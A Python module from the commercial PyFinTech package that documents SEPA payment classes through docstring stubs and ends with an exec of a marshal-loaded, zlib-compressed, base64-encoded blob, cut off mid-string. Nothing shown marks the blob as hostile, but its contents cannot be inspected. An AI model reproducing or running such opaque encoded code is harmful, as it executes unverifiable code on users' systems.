
###########################################################################
#
# LICENSE AGREEMENT
#
# Copyright (c) 2014-2024 joonis new media, Thimo Kraemer
#
# 1. Recitals
#
# joonis new media, Inh. Thimo Kraemer ("Licensor"), provides you
# ("Licensee") the program "PyFinTech" and associated documentation files
# (collectively, the "Software"). The Software is protected by German
# copyright laws and international treaties.
#
# 2. Public License
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this Software, to install and use the Software, copy, publish
# and distribute copies of the Software at any time, provided that this
# License Agreement is included in all copies or substantial portions of
# the Software, subject to the terms and conditions hereinafter set forth.
#
# 3. Temporary Multi-User/Multi-CPU License
#
# Licensor hereby grants to Licensee a temporary, non-exclusive license to
# install and use this Software according to the purpose agreed on up to
# an unlimited number of computers in its possession, subject to the terms
# and conditions hereinafter set forth. As consideration for this temporary
# license to use the Software granted to Licensee herein, Licensee shall
# pay to Licensor the agreed license fee.
#
# 4. Restrictions
#
# You may not use this Software in a way other than allowed in this
# license. You may not:
#
# - modify or adapt the Software or merge it into another program,
# - reverse engineer, disassemble, decompile or make any attempt to
#   discover the source code of the Software,
# - sublicense, rent, lease or lend any portion of the Software,
# - publish or distribute the associated license keycode.
#
# 5. Warranty and Remedy
#
# To the extent permitted by law, THE SOFTWARE IS PROVIDED "AS IS",
# WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
# LIMITED TO THE WARRANTIES OF QUALITY, TITLE, NONINFRINGEMENT,
# MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE, regardless of
# whether Licensor knows or had reason to know of Licensee particular
# needs. No employee, agent, or distributor of Licensor is authorized
# to modify this warranty, nor to make any additional warranties.
#
# IN NO EVENT WILL LICENSOR BE LIABLE TO LICENSEE FOR ANY DAMAGES,
# INCLUDING ANY LOST PROFITS, LOST SAVINGS, OR OTHER INCIDENTAL OR
# CONSEQUENTIAL DAMAGES ARISING FROM THE USE OR THE INABILITY TO USE THE
# SOFTWARE, EVEN IF LICENSOR OR AN AUTHORIZED DEALER OR DISTRIBUTOR HAS
# BEEN ADVISED OF THE POSSIBILITY OF THESE DAMAGES, OR FOR ANY CLAIM BY
# ANY OTHER PARTY. This does not apply if liability is mandatory due to
# intent or gross negligence.


"""
SEPA module of the Python Fintech package.

This module defines functions and classes to work with SEPA.
"""

__all__ = ['Account', 'Amount', 'SEPATransaction', 'SEPACreditTransfer', 'SEPADirectDebit', 'CAMTDocument', 'Mandate', 'MandateManager']

class Account:
    """Account class"""

    def __init__(self, iban, name, country=None, city=None, postcode=None, street=None):
        """
        Initializes the account instance.

        :param iban: Either the IBAN or a 2-tuple in the form of
            either (IBAN, BIC) or (ACCOUNT_NUMBER, BANK_CODE).
            The latter will be converted to the corresponding
            IBAN automatically. An IBAN is checked for validity.
        :param name: The name of the account holder.
        :param country: The country (ISO-3166 ALPHA 2) of the account
            holder (optional).
        :param city: The city of the account holder (optional).
        :param postcode: The postcode of the account holder (optional).
        :param street: The street of the account holder (optional).
        """
        ...

    @property
    def iban(self):
        """The IBAN of this account (read-only)."""
        ...

    @property
    def bic(self):
        """The BIC of this account (read-only)."""
        ...

    @property
    def name(self):
        """The name of the account holder (read-only)."""
        ...

    @property
    def country(self):
        """The country of the account holder (read-only)."""
        ...

    @property
    def city(self):
        """The city of the account holder (read-only)."""
        ...

    @property
    def postcode(self):
        """The postcode of the account holder (read-only)."""
        ...

    @property
    def street(self):
        """The street of the account holder (read-only)."""
        ...

    @property
    def address(self):
        """Tuple of unstructured address lines (read-only)."""
        ...

    def is_sepa(self):
        """
        Checks if this account seems to be valid
        within the Single Euro Payments Area.
        (added in v6.2.0)
        """
        ...

    def set_ultimate_name(self, name):
        """
        Sets the ultimate name used for SEPA transactions and by
        the :class:`MandateManager`.
        """
        ...

    @property
    def ultimate_name(self):
        """The ultimate name used for SEPA transactions."""
        ...

    def set_originator_id(self, cid=None, cuc=None):
        """
        Sets the originator id of the account holder (new in v6.1.1).

        :param cid: The SEPA creditor id. Required for direct debits
            and in some countries also for credit transfers.
        :param cuc: The CBI unique code (only required in Italy).
        """
        ...

    @property
    def cid(self):
        """The creditor id of the account holder (readonly)."""
        ...

    @property
    def cuc(self):
        """The CBI unique code (CUC) of the account holder (readonly)."""
        ...

    def set_mandate(self, mref, signed, recurrent=False):
        """
        Sets the SEPA mandate for this account.

        :param mref: The mandate reference.
        :param signed: The date of signature. Can be a date object
            or an ISO8601 formatted string.
        :param recurrent: Flag whether this is a recurrent mandate
            or not.
        :returns: A :class:`Mandate` object.
        """
        ...

    @property
    def mandate(self):
        """The assigned mandate (read-only)."""
        ...


class Amount:
    """
    The Amount class with an integrated currency converter.

    Arithmetic operations can be performed directly on this object.
    """

    default_currency = 'EUR'

    exchange_rates = {}

    implicit_conversion = False

    def __init__(self, value, currency=None):
        """
        Initializes the Amount instance.

        :param value: The amount value.
        :param currency: An ISO-4217 currency code. If not specified,
            it is set to the value of the class attribute
            :attr:`default_currency` which is initially set to EUR.
        """
        ...

    @property
    def value(self):
        """The amount value of type ``decimal.Decimal``."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code."""
        ...

    @property
    def decimals(self):
        """The number of decimal places (at least 2). Use the built-in ``round`` to adjust the decimal places."""
        ...

    @classmethod
    def update_exchange_rates(cls):
        """
        Updates the exchange rates based on the data provided by the
        European Central Bank and stores it in the class attribute
        :attr:`exchange_rates`. Usually it is not required to call
        this method directly, since it is called automatically by the
        method :func:`convert`.

        :returns: A boolean flag whether updated exchange rates
            were available or not.
        """
        ...

    def convert(self, currency):
        """
        Converts the amount to another currency on the bases of the
        current exchange rates provided by the European Central Bank.
        The exchange rates are automatically updated once a day and
        cached in memory for further usage.

        :param currency: The ISO-4217 code of the target currency.
        :returns: An :class:`Amount` object in the requested currency.
        """
        ...


class SEPATransaction:
    """
    The SEPATransaction class

    This class cannot be instantiated directly. An instance is returned
    by the method :func:`add_transaction` of a SEPA document instance
    or by the iterator of a :class:`CAMTDocument` instance.

    If it is a batch of other transactions, the instance can be treated
    as an iterable over all underlying transactions.
    """

    @property
    def bank_reference(self):
        """The bank reference, used to uniquely identify a transaction."""
        ...

    @property
    def iban(self):
        """The IBAN of the remote account (IBAN)."""
        ...

    @property
    def bic(self):
        """The BIC of the remote account (BIC)."""
        ...

    @property
    def name(self):
        """The name of the remote account holder."""
        ...

    @property
    def country(self):
        """The country of the remote account holder."""
        ...

    @property
    def address(self):
        """A tuple subclass which holds the address of the remote account holder. The tuple values represent the unstructured address. Structured fields can be accessed by the attributes *country*, *city*, *postcode* and *street*."""
        ...

    @property
    def ultimate_name(self):
        """The ultimate name of the remote account (ABWA/ABWE)."""
        ...

    @property
    def originator_id(self):
        """The creditor or debtor id of the remote account (CRED/DEBT)."""
        ...

    @property
    def amount(self):
        """The transaction amount of type :class:`Amount`. Debits are always signed negative."""
        ...

    @property
    def purpose(self):
        """A tuple of the transaction purpose (SVWZ)."""
        ...

    @property
    def date(self):
        """The booking date or appointed due date."""
        ...

    @property
    def valuta(self):
        """The value date."""
        ...

    @property
    def msgid(self):
        """The message id of the physical PAIN file."""
        ...

    @property
    def kref(self):
        """The id of the logical PAIN file (KREF)."""
        ...

    @property
    def eref(self):
        """The end-to-end reference (EREF)."""
        ...

    @property
    def mref(self):
        """The mandate reference (MREF)."""
        ...

    @property
    def purpose_code(self):
        """The external purpose code (PURP)."""
        ...

    @property
    def cheque(self):
        """The cheque number."""
        ...

    @property
    def info(self):
        """The transaction information (BOOKINGTEXT)."""
        ...

    @property
    def classification(self):
        """The transaction classification. For German banks it is a tuple in the form of (SWIFTCODE, GVC, PRIMANOTA, TEXTKEY), for French banks a tuple in the form of (DOMAINCODE, FAMILYCODE, SUBFAMILYCODE, TRANSACTIONCODE), otherwise a plain string."""
        ...

    @property
    def return_info(self):
        """A tuple of return code and reason."""
        ...

    @property
    def status(self):
        """The transaction status. A value of INFO, PDNG or BOOK."""
        ...

    @property
    def reversal(self):
        """The reversal indicator."""
        ...

    @property
    def batch(self):
        """Flag which indicates a batch transaction."""
        ...

    @property
    def camt_reference(self):
        """The reference to a CAMT file."""
        ...

    def get_account(self):
        """Returns an :class:`Account` instance of the remote account."""
        ...


class SEPACreditTransfer:
    """SEPACreditTransfer class"""

    def __init__(self, account, type='NORM', cutoff=14, batch=True, cat_purpose=None, scheme=None, currency=None):
        """
        Initializes the SEPA credit transfer instance.

        Supported pain schemes:

        - pain.001.003.03 (DE)
        - pain.001.001.03
        - pain.001.001.09 (*since v7.6*)
        - pain.001.001.03.ch.02 (CH)
        - pain.001.001.09.ch.03 (CH, *since v7.6*)
        - CBIPaymentRequest.00.04.00 (IT)
        - CBIPaymentRequest.00.04.01 (IT)
        - CBICrossBorderPaymentRequestLogMsg.00.01.01 (IT, *since v7.6*)

        :param account: The local debtor account.
        :param type: The credit transfer priority type (*NORM*, *HIGH*,
            *URGP*, *INST* or *SDVA*). (new in v6.2.0: *INST*,
            new in v7.0.0: *URGP*, new in v7.6.0: *SDVA*)
        :param cutoff: The cut-off time of the debtor's bank.
        :param batch: Flag whether SEPA batch mode is enabled or not.
        :param cat_purpose: The SEPA category purpose code. This code
            is used for special treatments by the local bank and is
            not forwarded to the remote bank. See module attribute
            CATEGORY_PURPOSE_CODES for possible values.
        :param scheme: The PAIN scheme of the document. If not
            specified, the scheme is set to *pain.001.001.03* for
            SEPA payments and *pain.001.001.09* for payments in
            currencies other than EUR.
            In Switzerland it is set to *pain.001.001.03.ch.02*,
            in Italy to *CBIPaymentRequest.00.04.00*.
        :param currency: The ISO-4217 code of the currency to use.
            It must match with the currency of the local account.
            If not specified, it defaults to the currency of the
            country the local IBAN belongs to.
        """
        ...

    @property
    def type(self):
        """The credit transfer priority type (read-only)."""
        ...

    def add_transaction(self, account, amount, purpose, eref=None, ext_purpose=None, due_date=None, charges='SHAR'):
        """
        Adds a transaction to the SEPACreditTransfer document.
        If :attr:`scl_check` is set to ``True``, it is verified that
        the transaction can be routed to the target bank.

        :param account: The remote creditor account.
        :param amount: The transaction amount as floating point number
            or an instance of :class:`Amount`.
        :param purpose: The transaction purpose text. If the value matches
            a valid ISO creditor reference number (starting with "RF..."),
            it is added as a structured reference. For other structured
            references a tuple can be passed in the form of
            (REFERENCE_NUMBER, PURPOSE_TEXT).
        :param eref: The end-to-end reference (optional).
        :param ext_purpose: The SEPA external purpose code (optional).
            This code is forwarded to the remote bank and the account
            holder. See module attribute EXTERNAL_PURPOSE_CODES for
            possible values.
        :param due_date: The due date. If it is an integer or ``None``,
            the next possible date is calculated starting from today
            plus the given number of days (considering holidays and
            the given cut-off time). If it is a date object or an
            ISO8601 formatted string, this date is used without
            further validation.
        :param charges: Specifies which party will bear the charges
            associated with the processing of an international
            transaction. Not applicable for SEPA transactions.
            Can be a value of SHAR (SHA), DEBT (OUR) or CRED (BEN).
            *(new in v7.6)*

        :returns: A :class:`SEPATransaction` instance.
        """
        ...

    def render(self):
        """Renders the SEPACreditTransfer document and returns it as XML."""
        ...

    @property
    def scheme(self):
        """The document scheme version (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id of this document (read-only)."""
        ...

    @property
    def account(self):
        """The local account (read-only)."""
        ...

    @property
    def cutoff(self):
        """The cut-off time of the local bank (read-only)."""
        ...

    @property
    def batch(self):
        """Flag if batch mode is enabled (read-only)."""
        ...

    @property
    def cat_purpose(self):
        """The category purpose (read-only)."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def new_batch(self, kref=None):
        """
        After calling this method additional transactions are added to a new
        batch (``PmtInf`` block). This could be useful if you want to divide
        transactions into different batches with unique KREF ids.

        :param kref: It is possible to set a custom KREF (``PmtInfId``) for
            the new batch (new in v7.2). Be aware that KREF ids should be
            unique over time and that all transactions must be grouped by
            particular SEPA specifications (date, sequence type, etc.) into
            separate batches. This is done automatically if you do not pass
            a custom KREF.
        """
        ...

    def send(self, ebics_client, use_ful=None):
        """
        Sends the SEPA document using the passed EBICS instance.

        :param ebics_client: The :class:`fintech.ebics.EbicsClient` instance.
        :param use_ful: Flag, whether to use the order type
            :func:`fintech.ebics.EbicsClient.FUL` for uploading the document
            or otherwise one of the suitable order types
            :func:`fintech.ebics.EbicsClient.CCT`,
            :func:`fintech.ebics.EbicsClient.CCU`,
            :func:`fintech.ebics.EbicsClient.CIP`,
            :func:`fintech.ebics.EbicsClient.AXZ`,
            :func:`fintech.ebics.EbicsClient.CDD`,
            :func:`fintech.ebics.EbicsClient.CDB`,
            :func:`fintech.ebics.EbicsClient.XE2`,
            :func:`fintech.ebics.EbicsClient.XE3` or
            :func:`fintech.ebics.EbicsClient.XE4`.
            If not specified, *use_ful* is set to ``True`` if the local
            account is originated in France, otherwise it is set to ``False``.
            With EBICS v3.0 the document is always uploaded via
            :func:`fintech.ebics.EbicsClient.BTU`.
        :returns: The EBICS order id.
        """
        ...


class SEPADirectDebit:
    """SEPADirectDebit class"""

    def __init__(self, account, type='CORE', cutoff=36, batch=True, cat_purpose=None, scheme=None, currency=None):
        """
        Initializes the SEPA direct debit instance.

        Supported pain schemes:

        - pain.008.003.02 (DE)
        - pain.008.001.02
        - pain.008.001.08 (*since v7.6*)
        - pain.008.001.02.ch.01 (CH)
        - CBISDDReqLogMsg.00.01.00 (IT)
        - CBISDDReqLogMsg.00.01.01 (IT)

        :param account: The local creditor account with an appointed
            creditor id.
        :param type: The direct debit type (*CORE* or *B2B*).
        :param cutoff: The cut-off time of the creditor's bank.
        :param batch: Flag if SEPA batch mode is enabled or not.
        :param cat_purpose: The SEPA category purpose code. This code
            is used for special treatments by the local bank and is
            not forwarded to the remote bank. See module attribute
            CATEGORY_PURPOSE_CODES for possible values.
        :param scheme: The PAIN scheme of the document. If not
            specified, the scheme is set to *pain.008.001.02*.
            In Switzerland it is set to *pain.008.001.02.ch.01*,
            in Italy to *CBISDDReqLogMsg.00.01.00*.
        :param currency: The ISO-4217 code of the currency to use.
            It must match with the currency of the local account.
            If not specified, it defaults to the currency of the
            country the local IBAN belongs to.
        """
        ...

    @property
    def type(self):
        """The direct debit type (read-only)."""
        ...

    def add_transaction(self, account, amount, purpose, eref=None, ext_purpose=None, due_date=None):
        """
        Adds a transaction to the SEPADirectDebit document.
        If :attr:`scl_check` is set to ``True``, it is verified that
        the transaction can be routed to the target bank.

        :param account: The remote debtor account with a valid mandate.
        :param amount: The transaction amount as floating point number
            or an instance of :class:`Amount`.
        :param purpose: The transaction purpose text. If the value matches
            a valid ISO creditor reference number (starting with "RF..."),
            it is added as a structured reference. For other structured
            references a tuple can be passed in the form of
            (REFERENCE_NUMBER, PURPOSE_TEXT).
        :param eref: The end-to-end reference (optional).
        :param ext_purpose: The SEPA external purpose code (optional).
            This code is forwarded to the remote bank and the account
            holder. See module attribute EXTERNAL_PURPOSE_CODES for
            possible values.
        :param due_date: The due date. If it is an integer or ``None``,
            the next possible date is calculated starting from today
            plus the given number of days (considering holidays, the
            lead time and the given cut-off time). If it is a date object
            or an ISO8601 formatted string, this date is used without
            further validation.

        :returns: A :class:`SEPATransaction` instance.
        """
        ...

    def render(self):
        """Renders the SEPADirectDebit document and returns it as XML."""
        ...

    @property
    def scheme(self):
        """The document scheme version (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id of this document (read-only)."""
        ...

    @property
    def account(self):
        """The local account (read-only)."""
        ...

    @property
    def cutoff(self):
        """The cut-off time of the local bank (read-only)."""
        ...

    @property
    def batch(self):
        """Flag if batch mode is enabled (read-only)."""
        ...

    @property
    def cat_purpose(self):
        """The category purpose (read-only)."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def new_batch(self, kref=None):
        """
        After calling this method additional transactions are added to a new
        batch (``PmtInf`` block). This could be useful if you want to divide
        transactions into different batches with unique KREF ids.

        :param kref: It is possible to set a custom KREF (``PmtInfId``) for
            the new batch (new in v7.2). Be aware that KREF ids should be
            unique over time and that all transactions must be grouped by
            particular SEPA specifications (date, sequence type, etc.) into
            separate batches. This is done automatically if you do not pass
            a custom KREF.
        """
        ...

    def send(self, ebics_client, use_ful=None):
        """
        Sends the SEPA document using the passed EBICS instance.

        :param ebics_client: The :class:`fintech.ebics.EbicsClient` instance.
        :param use_ful: Flag, whether to use the order type
            :func:`fintech.ebics.EbicsClient.FUL` for uploading the document
            or otherwise one of the suitable order types
            :func:`fintech.ebics.EbicsClient.CCT`,
            :func:`fintech.ebics.EbicsClient.CCU`,
            :func:`fintech.ebics.EbicsClient.CIP`,
            :func:`fintech.ebics.EbicsClient.AXZ`,
            :func:`fintech.ebics.EbicsClient.CDD`,
            :func:`fintech.ebics.EbicsClient.CDB`,
            :func:`fintech.ebics.EbicsClient.XE2`,
            :func:`fintech.ebics.EbicsClient.XE3` or
            :func:`fintech.ebics.EbicsClient.XE4`.
            If not specified, *use_ful* is set to ``True`` if the local
            account is originated in France, otherwise it is set to ``False``.
            With EBICS v3.0 the document is always uploaded via
            :func:`fintech.ebics.EbicsClient.BTU`.
        :returns: The EBICS order id.
        """
        ...


class CAMTDocument:
    """
    The CAMTDocument class is used to parse CAMT52, CAMT53 or CAMT54
    documents. An instance can be treated as an iterable over its
    transactions, each represented as an instance of type
    :class:`SEPATransaction`.

    Note: If orders were submitted in batch mode, there are three
    methods to resolve the underlying transactions. Either (A) directly
    within the CAMT52/CAMT53 document, (B) within a separate CAMT54
    document or (C) by a reference to the originally transfered PAIN
    message. The applied method depends on the bank (method B is most
    commonly used).
    """

    def __init__(self, xml, camt54=None):
        """
        Initializes the CAMTDocument instance.

        :param xml: The XML string of a CAMT document to be parsed
            (either CAMT52, CAMT53 or CAMT54).
        :param camt54: In case `xml` is a CAMT52 or CAMT53 document, an
            additional CAMT54 document or a sequence of such documents
            can be passed which are automatically merged with the
            corresponding batch transactions.
        """
        ...

    @property
    def type(self):
        """The CAMT type, eg. *camt.053.001.02* (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id (read-only)."""
        ...

    @property
    def created(self):
        """The date of creation (read-only)."""
        ...

    @property
    def reference_id(self):
        """A unique reference number (read-only)."""
        ...

    @property
    def sequence_id(self):
        """The statement sequence number (read-only)."""
        ...

    @property
    def info(self):
        """Some info text about the document (read-only)."""
        ...

    @property
    def iban(self):
        """The local IBAN (read-only)."""
        ...

    @property
    def bic(self):
        """The local BIC (read-only)."""
        ...

    @property
    def name(self):
        """The name of the account holder (read-only)."""
        ...

    @property
    def currency(self):
        """The currency of the account (read-only)."""
        ...

    @property
    def date_from(self):
        """The start date (read-only)."""
        ...

    @property
    def date_to(self):
        """The end date (read-only)."""
        ...

    @property
    def balance_open(self):
        """The opening balance of type :class:`Amount` (read-only)."""
        ...

    @property
    def balance_close(self):
        """The closing balance of type :class:`Amount` (read-only)."""
        ...


class Mandate:
    """SEPA mandate class."""

    def __init__(self, path):
        """
        Initializes the SEPA mandate instance.

        :param path: The path to a SEPA PDF file.
        """
        ...

    @property
    def mref(self):
        """The mandate reference (read-only)."""
        ...

    @property
    def signed(self):
        """The date of signature (read-only)."""
        ...

    @property
    def b2b(self):
        """Flag if it is a B2B mandate (read-only)."""
        ...

    @property
    def cid(self):
        """The creditor id (read-only)."""
        ...

    @property
    def created(self):
        """The creation date (read-only)."""
        ...

    @property
    def modified(self):
        """The last modification date (read-only)."""
        ...

    @property
    def executed(self):
        """The last execution date (read-only)."""
        ...

    @property
    def closed(self):
        """Flag if the mandate is closed (read-only)."""
        ...

    @property
    def debtor(self):
        """The debtor account (read-only)."""
        ...

    @property
    def creditor(self):
        """The creditor account (read-only)."""
        ...

    @property
    def pdf_path(self):
        """The path to the PDF file (read-only)."""
        ...

    @property
    def recurrent(self):
        """Flag whether this mandate is recurrent or not."""
        ...

    def is_valid(self):
        """Checks if this SEPA mandate is still valid."""
        ...


class MandateManager:
    """
    A MandateManager manages all SEPA mandates that are required
    for SEPA direct debit transactions.

    It stores all mandates as PDF files in a given directory.

    .. warning::

        The MandateManager is still BETA. Don't use for production!
    """

    def __init__(self, path, account):
        """
        Initializes the mandate manager instance.

        :param path: The path to a directory where all mandates
            are stored. If it does not exist it will be created.
        :param account: The creditor account with the full address
            and an appointed creditor id.
        """
        ...

    @property
    def path(self):
        """The path where all mandates are stored (read-only)."""
        ...

    @property
    def account(self):
        """The creditor account (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def get_mandate(self, mref):
        """
        Get a stored SEPA mandate.

        :param mref: The mandate reference.
        :returns: A :class:`Mandate` object.
        """
        ...

    def get_account(self, mref):
        """
        Get the debtor account of a SEPA mandate.

        :param mref: The mandate reference.
        :returns: A :class:`Account` object.
        """
        ...

    def get_pdf(self, mref, save_as=None):
        """
        Get the PDF document of a SEPA mandate.

        All SEPA meta data is removed from the PDF.

        :param mref: The mandate reference.
        :param save_as: If given, it must be the destination path
            where the PDF file is saved.
        :returns: The raw PDF data.
        """
        ...

    def add_mandate(self, account, mref=None, signature=None, recurrent=True, b2b=False, lang=None):
        """
        Adds a new SEPA mandate and creates the corresponding PDF file.
        If :attr:`scl_check` is set to ``True``, it is verified that
        a direct debit transaction can be routed to the target bank.

        :param account: The debtor account with the full address.
        :param mref: The mandate reference. If not specified, a new
            reference number will be created.
        :param signature: The signature which must be the full name
            of the account holder. If given, the mandate is marked
            as signed. Otherwise the method :func:`sign_mandate`
            must be called before the mandate can be used for a
            direct debit.
        :param recurrent: Flag if it is a recurrent mandate or not.
        :param b2b: Flag if it is a B2B mandate or not.
        :param lang: ISO 639-1 language code of the mandate to create.
            Defaults to the language of the account holder's country.
        :returns: The created or passed mandate reference.
        """
        ...

    def sign_mandate(self, document, mref=None, signed=None):
        """
        Updates a SEPA mandate with a signed document.

        :param document: The path to the signed document, which can
            be an image or PDF file.
        :param mref: The mandate reference. If not specified and
            *document* points to an image, the image is scanned for
            a Code39 barcode which represents the mandate reference.
        :param signed: The date of signature. If not specified, the
            current date is used.
        :returns: The mandate reference.
        """
        ...

    def update_mandate(self, mref, executed=None, closed=None):
        """
        Updates the SEPA meta data of a mandate.

        :param mref: The mandate reference.
        :param executed: The last execution date. Can be a date
            object or an ISO8601 formatted string.
        :param closed: Flag if this mandate is closed.
        """
        ...

    def archive_mandates(self, zipfile):
        """
        Archives all closed SEPA mandates.

        Currently not implemented!

        :param zipfile: The path to a zip file.
        """
        ...



from typing import TYPE_CHECKING
if not TYPE_CHECKING:
    import marshal, zlib, base64
    exec(marshal.loads(zlib.decompress(base64.b64decode(
        b'eJy0fQlAVMf5+Ly3J8uyIALivd6ssAve94GKAsslhwcal4W3wOpyuIdX8D4AETUe0USN932Lt0aTmTRNkzRpkzZN99df07RNm6ZterepbeL/m3lvD2BBbX9/keHNe/Pm'
        b'm+Ob75pvvvcL1OafDH6nwq9rIiQCKkYVqJgTOIHfhIp5m+yIXJAd5ZzRgtym2IiWIVe3BbxNKSg2chs4m8rGb+Q4JCgLUNgmg+rRYk1BWl6qvqpG8Dhs+ppyvbvSps9b'
        b'6a6sqdbPtFe7bWWV+lpr2RJrhc2k0RRW2l2+soKt3F5tc+nLPdVlbntNtUtvrRb0ZQ6rywV33TX65TXOJfrldnelnoIwacqGBPVhKPwmwG847ccGSOpRPVfP18vq5fWK'
        b'emW9ql5dH1avqQ+v19ZH1OvqI+uj6rvUR9d3rY+pj62Pq+9WH1/fvb5Hfc/6XvW96/vU963X1/er718/oH5g/aD6wfVDyhPYiKhXJzTIN6LVhlVhdQkb0VxUZ9iIOLQm'
        b'YY2hIOh6OQorN8hyyoKHmYPf4fDblTZRzoa6ABkicxxq+sAsQ3BvihyVZG2MWow8A+EmPj4qmTSRxtysHLxjNmkgzbkG0pxRlGdUoiFpcvIQn881yDy9oCjZRfYtMGck'
        b'ZRhJI9mWrUDTyAYd2SrL6YK3e2KhwBByCt+lBeIGK5BczuHD4/FWT18KZQtpIdcS2XvZGaTZkCFH0WS3bDE+iO/magy8pwcFcGDhbPPwEfDcTLbnZihQZD8Zvj1ygnao'
        b'pzc8nmTB2+njjGzxqY5ckpG7pGkYuU1uQBW0jXgzPhztoiUAEtnGIU0GvoRP8PhKt6meway/dtxEDpMd4eRaJLnhwo3kVi25vhQ3RUYg1GuAXIUv4OMGztOdFr6IL1eT'
        b'pqxMsm0OPi5DMvKAwwfwaQ08p9hALpIjdjO+mABDstVMtuHGXNo03JycYzQoET6Mz85KU9XhRjW8EE9feHlUJIzEtuysXAU+tQIp6jhygpxUSY9HkaPkbmKmMSnbaOKQ'
        b'NlaDT8g0k/AheMwmoAU3RyemJw0ljVm0b+FkZzS+zpNLCnK6jGuz2kb40GA/xdTWeIr+W0ytT6g31A+tT6xPqjfWm+qT61Pqh9UPLx8h4S/XEAb4ywP+cgx/eYaz3Bq+'
        b'IOga8LeiLf7Shvdsh7+LRPwdN02JtBoYJ31J1kNjH8RunnXKUMNqmDpA6nfGrxZvPjcqDO2ZNQjulThKFk8Sb6pGy9HPhC5Ah0qSLssWoLPIoYHbV/Lj5X+dfGQAQp8O'
        b'+TN/c9ij6AnIEQYPHlTt564UfBAO5Yf/xPl14mHx9vbwP0fuWXK7N5/3M+6bectrliEv8hjhQTq5gF+CpdSUPDshgWxNTgecwGcLEzKzyY4kU8bgbGNmNoeqI8Mm4RMJ'
        b'njQ6nycHk70ut3PZUo+L3CJXyHVyjdwkV8kN0hKp1mp0YRHheAduwNuGp4wcPnrYKCjUOALfwlfkCD9YEEYuLiFXPJlQUw9yiLSYszJzMrLNZAes4m1kKyyBRtIMzUlI'
        b'GmoyGBPxZXwGX8iH16+RfeQFspfsJC+S3WTP3BHkDELdUiKiK/DVVnhEZ0AFv93odIz1UTxZuUyaZ74BZnO1DOaZZ/MsY3PLr5EVBF2HmmdOqrz1PMtznBQB7BOKryPX'
        b'OLj6/OBQs3Xha997/crOqy/2U7x1zjrvtdtRby147frOoy8e3Wh/dRrnUpVFkGmnkuJ2pqfIKsajzKqInrocg8LN1u/pynCYka0wJNuA9o3j8MFwfJW85HAzclNPtkQk'
        b'mshJvB9GrDGJQ0q8nTea8A437fAQvKss0Ugu9ExIN/Lw6GXeCNTmLKt4GRCJhkRjBEx4c9YwBVIWc0ALLpC97jgK9qQTKmxKxxcByKkCfjU304UbDJyXTzAYZE7a36CE'
        b'h+RR7MRyZ80qW7W+XGRgJpet1jrZK/PYBfrcpYREMz2ai+acSt9LBrk3rNpaZXMBs7N55VZnhcurslicnmqLxRtusZQ5bNZqT63FYuAD4OCaLgYnnVangia0vhkURgwk'
        b'UQ+UPM8pOZrKOeU3NGW0Ha9bgq8nQm85xCdU4P3cdLylYGYZHwJb2KSOp9jCM3yRl8v9+CJ7Knxpx9coWmja4UvXHNa0BeQufujKUiB8xYDIWZh1fC7dQ3szkBzAO8zw'
        b'hKybwcGzeny3H3sAjOrcNNKSC09OpXHw5o0is4dWjvdXRJEmuN9jPJeGYI3cF2vCl5eT9eHA88hVfIXrgvC96LXshTnWtYlwG2/L4GYDAyMP8DX2gps8JC2JJiUiW/AO'
        b'bgEip8tV7MFzgI77yO7ZFNZatApl47uV4ghvJJfxTQFvJ7thSpJQEqzpPYYwTzRt7/38AamGCTDaZDP8J6dLxFZdJHdHhZEXn6cPTsJ/ciyRPRhF6UHNCHwPaiL74H8X'
        b'/DJr7ui1eGdOd8Lu34L/ePdyD0V2cq2GHMTrcT2+B2NNDsF/DLSDvTODnMsdjC8R9uRV+L98NnsHnywE2rSDHMf3IuHJEfgPI7ybNSAfnyPrya5acpynAlM4Pk82sJ7k'
        b'4BZyp1dmAdQ1BASGw+ShJ4rCP7eqd9hyshvwJwWlTI8QAdwm2wWgUPtUCB+ahfAOZAEae489m7QC+GiLi7Qsw5dcgJPkDDeQvDqOEZBWNIwPJjV02VegOvQc8Kg6rgEk'
        b'TSdfx73ALwXOFFbBVhVLzvJe3pTi5crOcoFFypaLVzPRYXe5y2qqaifPo1XSJ/HIQ+XaymjeLMkuTARIJ3ugtyBgDAL5KodsM+CbsuHDcZMZ74Kmh5MLCN8nd8PxlRHk'
        b'gd3hmMy5GqGWNb1eH9U8QYdTomYs/7by51GTxxw59bO4O6nFn8/8Tb/oooXr3/iVLubv2a+nukfk5o7Y8nrP8Uej3X9dWPud2ETlR3+I+tbOge/IP/yfq8KllpySstvv'
        b'ZO357r5P399CTg5PCJtffOcHFTOaE947M2Cra9JL5u09D/S89Z2HJ+Z+eXvtnC1z+hR/tPbwoU3fyBYtTRhtKgMiSoUS/GACfjnRZCBbk/ALZCcCUniBH2GyualIoian'
        b'hoDAQhoysmD2N+coYKqv8oB9r+BLjBYCsu6oIk1JINQZB7uVSLmIH6BE7n7wqDuwol2MYZKtIKuRRnwhE79qV6CuI2VkVxq+x6j0WALL2UfEyWWZSMevDiDn25FSg7wt'
        b'bW0zd+G26rIawWahxJWR1f4UOdLlnBp+gOx9o5bJOQ1cazn14yiZDv7GQ84ZFURyOZdXU11jcYHSUGlzOalI4KSkqX1reCdFeGcXP6Wl1WT4KG30nRCUVk9HrLE7Pt0a'
